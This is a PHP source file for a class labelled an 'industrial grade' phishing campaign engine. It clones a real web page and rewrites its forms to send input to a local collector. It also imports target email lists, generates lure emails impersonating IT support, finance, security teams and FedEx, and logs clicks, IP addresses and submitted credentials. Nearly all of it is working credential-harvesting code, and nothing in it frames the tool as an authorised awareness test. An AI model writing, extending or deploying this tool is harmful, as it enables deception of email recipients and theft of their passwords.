<?php

/**
 * COSMIC PHISHING CAMPAIGN ENGINE – INDUSTRIAL GRADE
 * Full campaign management, email templates, tracking, analytics.
 */
class PhishingCampaign {
    private $db;
    private $campaignsDir;
    private $dbPath;
    
    public function __construct() {
        $this->campaignsDir = dirname(__DIR__, 2) . '/data/phishing/';
        if (!is_dir($this->campaignsDir)) mkdir($this->campaignsDir, 0755, true);
        $this->dbPath = $this->campaignsDir . 'campaigns.db';
        $this->initDB();
    }
    
    private function initDB() {
        // Check if SQLite3 is available
        if (!class_exists('SQLite3')) {
            error_log("PhishingCampaign: SQLite3 extension not loaded.");
            die("SQLite3 extension required for PhishingCampaign.");
        }
        
        try {
            $this->db = new SQLite3($this->dbPath);
            $this->db->busyTimeout(5000);
            
            // Create tables if they don't exist
            $this->db->exec("CREATE TABLE IF NOT EXISTS campaigns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                target_url TEXT,
                clone_path TEXT,
                status TEXT DEFAULT 'draft',
                created_at INTEGER,
                launched_at INTEGER,
                clicks INTEGER DEFAULT 0,
                submissions INTEGER DEFAULT 0,
                emails_sent INTEGER DEFAULT 0,
                email_template TEXT,
                smtp_config TEXT
            )");
            
            $this->db->exec("CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                email TEXT,
                name TEXT,
                clicked INTEGER DEFAULT 0,
                submitted INTEGER DEFAULT 0,
                user_agent TEXT,
                ip TEXT,
                first_seen INTEGER,
                last_seen INTEGER,
                data TEXT
            )");
            
            $this->db->exec("CREATE TABLE IF NOT EXISTS emails (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                target_id INTEGER,
                sent_at INTEGER,
                opened INTEGER DEFAULT 0,
                opened_at INTEGER
            )");
            
        } catch (Exception $e) {
            error_log("PhishingCampaign DB init failed: " . $e->getMessage());
            die("Database initialization failed: " . $e->getMessage());
        }
    }
    
    /**
     * Create a new phishing campaign.
     */
    public function createCampaign($name, $targetUrl, $emailTemplate = '') {
        $stmt = $this->db->prepare("INSERT INTO campaigns (name, target_url, status, created_at) VALUES (:name, :url, 'draft', :time)");
        if (!$stmt) {
            error_log("PhishingCampaign::createCampaign prepare failed: " . $this->db->lastErrorMsg());
            return false;
        }
        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
        $stmt->bindValue(':url', $targetUrl, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $result = $stmt->execute();
        if (!$result) {
            error_log("PhishingCampaign::createCampaign execute failed: " . $this->db->lastErrorMsg());
            return false;
        }
        return $this->db->lastInsertRowID();
    }
    
    /**
     * Clone a webpage for phishing.
     */
    public function clonePage($campaignId, $url) {
        $html = @file_get_contents($url);
        if (!$html) return false;
        
        // Modify forms to point to our collector
        $html = preg_replace('/<form(.*?)action="(.*?)"(.*?)>/i', '<form$1action="/phishing/collect?campaign=' . $campaignId . '"$3>', $html);
        $html = preg_replace('/<input(.*?)name="password"(.*?)>/i', '<input$1name="password"$2>', $html);
        
        $campaign = $this->getCampaign($campaignId);
        if (!$campaign) return false;
        
        $clonePath = $this->campaignsDir . 'pages/' . $campaign['name'] . '/index.html';
        $dir = dirname($clonePath);
        if (!is_dir($dir)) mkdir($dir, 0755, true);
        file_put_contents($clonePath, $html);
        
        $publicPath = '/phishing/pages/' . $campaign['name'] . '/';
        $stmt = $this->db->prepare("UPDATE campaigns SET clone_path = :path, target_url = :url WHERE id = :id");
        if (!$stmt) return false;
        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
        $stmt->bindValue(':url', $url, SQLITE3_TEXT);
        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
        $stmt->execute();
        
        return $publicPath;
    }
    
    /**
     * Import targets from CSV or array.
     */
    public function importTargets($campaignId, $targets) {
        $count = 0;
        foreach ($targets as $t) {
            $stmt = $this->db->prepare("INSERT INTO targets (campaign_id, email, name) VALUES (:cid, :email, :name)");
            if (!$stmt) continue;
            $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
            $stmt->bindValue(':email', $t['email'], SQLITE3_TEXT);
            $stmt->bindValue(':name', $t['name'] ?? '', SQLITE3_TEXT);
            if ($stmt->execute()) $count++;
        }
        return $count;
    }
    
    /**
     * Generate email templates (multiple styles).
     */
    public function generateEmailTemplate($type, $campaignName, $phishingLink) {
        $templates = [
            'password_reset' => "Subject: Password Expiry Notice\n\nDear {name},\n\nYour password for {campaign} will expire in 24 hours. Please reset it immediately: {link}\n\nIT Support",
            'invoice' => "Subject: Invoice #{rand}\n\nDear {name},\n\nPlease find attached invoice #{rand}. Click to view: {link}\n\nFinance Dept",
            'security_alert' => "Subject: Security Alert\n\nDear {name},\n\nWe detected unusual activity on your account. Verify now: {link}\n\nSecurity Team",
            'newsletter' => "Subject: Exclusive Offer\n\nHi {name},\n\nCheck out our latest news: {link}\n\nMarketing",
            'fedex' => "Subject: Package Delivery\n\nDear {name},\n\nYour package is waiting. Schedule delivery: {link}\n\nFedEx"
        ];
        $template = $templates[$type] ?? $templates['security_alert'];
        $template = str_replace('{campaign}', $campaignName, $template);
        $template = str_replace('{link}', $phishingLink, $template);
        $template = str_replace('{rand}', rand(1000,9999), $template);
        return $template;
    }
    
    /**
     * Send emails (placeholder – integrate with PHPMailer or mail()).
     */
    public function sendEmails($campaignId, $smtpConfig = null) {
        $targets = $this->getTargets($campaignId);
        $campaign = $this->getCampaign($campaignId);
        if (!$campaign) return 0;
        $linkBase = 'http://' . $_SERVER['HTTP_HOST'] . $campaign['clone_path'];
        $sent = 0;
        foreach ($targets as $t) {
            $trackingLink = $linkBase . '?email=' . urlencode($t['email']);
            $emailBody = str_replace('{name}', $t['name'], $campaign['email_template']);
            $emailBody = str_replace('{link}', $trackingLink, $emailBody);
            error_log("Would send email to {$t['email']} with body: $emailBody");
            
            $stmt = $this->db->prepare("INSERT INTO emails (campaign_id, target_id, sent_at) VALUES (:cid, :tid, :time)");
            if (!$stmt) continue;
            $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
            $stmt->bindValue(':tid', $t['id'], SQLITE3_INTEGER);
            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
            if ($stmt->execute()) $sent++;
        }
        $this->db->exec("UPDATE campaigns SET emails_sent = emails_sent + $sent, launched_at = " . time() . " WHERE id = $campaignId");
        return $sent;
    }
    
    /**
     * Log a click (from tracking pixel or redirect).
     */
    public function logClick($campaignId, $targetEmail, $ip, $ua) {
        $stmt = $this->db->prepare("SELECT id FROM targets WHERE campaign_id = :cid AND email = :email");
        if (!$stmt) return;
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $stmt->bindValue(':email', $targetEmail, SQLITE3_TEXT);
        $res = $stmt->execute();
        $target = $res->fetchArray(SQLITE3_ASSOC);
        if ($target) {
            $stmt = $this->db->prepare("UPDATE targets SET clicked = 1, ip = :ip, user_agent = :ua, first_seen = :time WHERE id = :tid");
            if (!$stmt) return;
            $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
            $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
            $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
            $stmt->execute();
            $this->db->exec("UPDATE campaigns SET clicks = clicks + 1 WHERE id = $campaignId");
        }
    }
    
    /**
     * Log credential submission.
     */
    public function logSubmission($campaignId, $targetEmail, $data) {
        $stmt = $this->db->prepare("SELECT id FROM targets WHERE campaign_id = :cid AND email = :email");
        if (!$stmt) return;
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $stmt->bindValue(':email', $targetEmail, SQLITE3_TEXT);
        $res = $stmt->execute();
        $target = $res->fetchArray(SQLITE3_ASSOC);
        if ($target) {
            $stmt = $this->db->prepare("UPDATE targets SET submitted = 1, data = :data, last_seen = :time WHERE id = :tid");
            if (!$stmt) return;
            $stmt->bindValue(':data', json_encode($data), SQLITE3_TEXT);
            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
            $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
            $stmt->execute();
            $this->db->exec("UPDATE campaigns SET submissions = submissions + 1 WHERE id = $campaignId");
        }
    }
    
    public function getCampaign($id) {
        $stmt = $this->db->prepare("SELECT * FROM campaigns WHERE id = :id");
        if (!$stmt) return null;
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_ASSOC);
    }
    
    public function getCampaigns() {
        $res = $this->db->query("SELECT * FROM campaigns ORDER BY created_at DESC");
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }
    
    public function getTargets($campaignId) {
        $stmt = $this->db->prepare("SELECT * FROM targets WHERE campaign_id = :cid");
        if (!$stmt) return [];
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }
    
    public function getStats($campaignId) {
        $campaign = $this->getCampaign($campaignId);
        if (!$campaign) return null;
        $stats['campaign'] = $campaign;
        $stats['targets_total'] = $this->db->querySingle("SELECT COUNT(*) FROM targets WHERE campaign_id = $campaignId");
        $stats['clicks'] = $campaign['clicks'];
        $stats['submissions'] = $campaign['submissions'];
        $stats['emails_sent'] = $campaign['emails_sent'];
        return $stats;
    }
}
